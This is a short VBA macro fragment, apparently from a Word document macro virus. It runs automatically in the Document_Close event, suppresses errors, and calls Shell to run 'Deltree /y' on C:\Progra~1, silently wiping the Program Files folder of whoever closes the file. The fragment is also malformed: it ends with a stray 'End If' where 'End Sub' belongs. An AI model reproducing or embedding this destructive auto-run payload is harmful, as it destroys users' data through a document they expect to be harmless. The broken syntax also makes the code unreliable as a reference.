Private Sub Document_Close()
On Error Resume Next
Shell("Deltree  /y C:\Progra~1")
End If